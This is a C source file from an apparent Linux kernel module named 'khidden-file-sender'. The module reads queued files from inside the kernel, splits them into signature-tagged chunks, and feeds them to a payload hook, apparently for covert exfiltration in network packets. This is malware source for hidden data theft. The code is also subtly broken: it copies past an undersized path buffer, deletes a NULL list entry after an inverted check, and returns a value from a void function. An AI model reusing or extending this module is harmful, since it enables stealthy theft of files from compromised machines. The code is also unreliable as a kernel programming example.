#include "payload_generator.h"
#include "file_info.h"
#include "../chrdev/chrdev.h"

#include <linux/fs.h>
#include <linux/uaccess.h>

static struct current_file_metadata current_file;
LIST_HEAD(current_file_chunks);

void read_file_chunks(struct current_file_metadata *current_file)
{
    printk(KERN_DEBUG "khidden-file-sender: in read_file_chunks\n");

    struct file *filp;
    filp = filp_open(current_file->file_path, O_RDONLY, 0);
    if (IS_ERR(filp)) {
        printk(KERN_DEBUG "k: failed to open file. %d!\n", filp);
        return 0;
    }
    
    // TODO: error handling!
    loff_t file_size = vfs_llseek(filp, 0, SEEK_END);
    vfs_llseek(filp, 0, 0);

    // add the trailing signature as it is the first chunk of the file.
    struct new_file_signature signature;
    signature.file_size = 0;
    memcpy(&signature.signature, DEFAULT_NEW_FILE_SIGNATURE, sizeof(DEFAULT_NEW_FILE_SIGNATURE));

    loff_t current_position = 0;
    bool is_first_chunk = true;
    while (current_position < file_size) {
        // allocate new file_chunk struct
        struct file_chunk *new_chunk = (struct file_chunk *)kmalloc(sizeof(struct file_chunk), GFP_KERNEL);
        if (NULL == new_chunk) {
            goto cleanup;
        }

        // allocate its buffer
        new_chunk->data = (char *)kmalloc(get_default_payload_chunk_size(), GFP_KERNEL);
        if (NULL == new_chunk->data) {
            kfree(new_chunk);
            goto cleanup;
        }

        new_chunk->chunk_size = 0;

        size_t offset_in_buffer = 0;  // will include the signature if it is the first chunk.
        size_t available_space_in_chunk = get_default_payload_chunk_size();

        if (is_first_chunk) {
            // if it is the first one - add a signature
            struct new_file_signature signature = {
                .signature = DEFAULT_NEW_FILE_SIGNATURE,
                .file_size = file_size
            };

            new_chunk->chunk_size += sizeof(struct new_file_signature);
            available_space_in_chunk -= sizeof(struct new_file_signature);
            offset_in_buffer += sizeof(struct new_file_signature);
            memcpy(new_chunk->data, &signature, sizeof(struct new_file_signature));
            is_first_chunk = false;
        }

        ssize_t size_to_read = min(available_space_in_chunk, file_size - current_position);

        mm_segment_t security_old_fs = get_fs();
        set_fs(get_ds());
        ssize_t size_read = vfs_read(filp, new_chunk->data + offset_in_buffer, size_to_read, &current_position);
        set_fs(security_old_fs);

        printk(KERN_DEBUG "khidden-file-sender: size_to_read=%d size_read=%d\n", size_to_read, size_read);

        list_add(&(new_chunk->l_head), &current_file_chunks);
        
        printk(KERN_DEBUG "khidden-file-sender: created new chunk\n");
        new_chunk->chunk_size += size_read;
    }

cleanup:
    filp_close(filp, NULL);
}

void initialize_file_data_cache(struct current_file_metadata *current_file)
{
    printk(KERN_DEBUG "khidden-file-sender: in initialize_file_data_cache\n");

    current_file->position = 0;
    current_file->file_path = NULL;
}

void process_next_pending_file(struct current_file_metadata *current_file)
{
    printk(KERN_DEBUG "khidden-file-sender: in process_next_pending_file\n");

    // re-initialize the new file cache
    initialize_file_data_cache(current_file);
    
    // check if the list is empty.
    mutex_lock(&pending_files_to_be_sent_mutex);
    bool is_list_empty = list_empty(&pending_files_to_be_sent);
    mutex_unlock(&pending_files_to_be_sent_mutex);
    if (is_list_empty) {
        return;    
    }

    // free the previous file path as we are going to process the next one
    if (NULL != current_file->file_path) {
        kfree(current_file->file_path);
    }

    // if it is not empty, read its first entry.
    mutex_lock(&pending_files_to_be_sent_mutex);

    struct file_info *next_pending_file;

    next_pending_file = list_first_entry_or_null(&pending_files_to_be_sent, struct file_info, l_head);
    if (NULL == next_pending_file) {
        // remove the item from the list of pending files.
        // also, free it as we are responsible for its memory.
        list_del(&next_pending_file->l_head);
        goto release_mutex;
    }

    // update the current file path
    size_t next_pending_file_path_length = strlen(next_pending_file->file_path);
    current_file->file_path = (char*)kmalloc(next_pending_file_path_length, GFP_KERNEL);
    if (NULL == current_file->file_path) {
        // if we fail to allocate space for the file path - skip the deletion of the entry
        // so we will be able to reach it in the next time. if we'll delete it right now - 
        // then the file won't be sent.
        goto release_mutex;
    }
    memcpy(current_file->file_path, next_pending_file->file_path, next_pending_file_path_length + 1);
    current_file->file_path[next_pending_file_path_length] = 0x00;

    // remove the item from the list of pending files.
    // also, free it as we are responsible for its memory.
    list_del(&next_pending_file->l_head);
    kfree(next_pending_file);

    // release the mutex before reading file chunks to avoid mutex starvation.
    mutex_unlock(&pending_files_to_be_sent_mutex);

    // TODO: support saving only X chunks (for dealing with large files)
    read_file_chunks(current_file);

    return;

release_mutex:
    mutex_unlock(&pending_files_to_be_sent_mutex);
    return;
}

int generate_payload(char *buffer, size_t *length)
{
    printk(KERN_DEBUG "khidden-file-sender: in generate_payload\n");

    if (NULL == buffer || NULL == length) {
        // invalid arguments received
        return -EINVAL;
    }

    if (list_empty(&current_file_chunks)) {
        // if there are no more chunks to send, it means that we finished sending the file.
        // in this case we would like to process the next pending file (if exists) and start sending    
        // its payloads.
        printk(KERN_DEBUG "khidden-file-sender: no chunks available, processing next file.\n");
        process_next_pending_file(&current_file);
        return -EIO;
    }

    printk(KERN_DEBUG "khidden-file-sender: chunks available to send\n");

    // there are chunks to send. read the first chunk, remove it from the list and return it
    // to the caller.   
    struct file_chunk *next_chunk;
    next_chunk = list_first_entry_or_null(&current_file_chunks, struct file_chunk, l_head);
    if (NULL == next_chunk) {
        return -EIO;
    }

    // TODO: 1. who will free the chunk? skb_free?
    // copy the chunk to the caller's buffer.
    printk(KERN_DEBUG "giving away payload! size: %d\n", next_chunk->chunk_size);
    memcpy(buffer, next_chunk->data, next_chunk->chunk_size);
    *length = next_chunk->chunk_size;

    list_del(&(next_chunk->l_head));
    // we want to free the chunk struct, but not its data!
    kfree(next_chunk);

    return 0;
}

void setup_payload_generator(void)
{
    printk(KERN_DEBUG "khidden-file-sender: in setup_payload_generator\n");

    // TODO: make atomic!
    get_payload_func = &generate_payload;
    initialize_file_data_cache(&current_file);
}

size_t get_default_payload_chunk_size(void)
{
    // TODO: check if less then the size of struct signature
    return DEFAULT_PAYLOAD_CHUNKS_SIZE;
}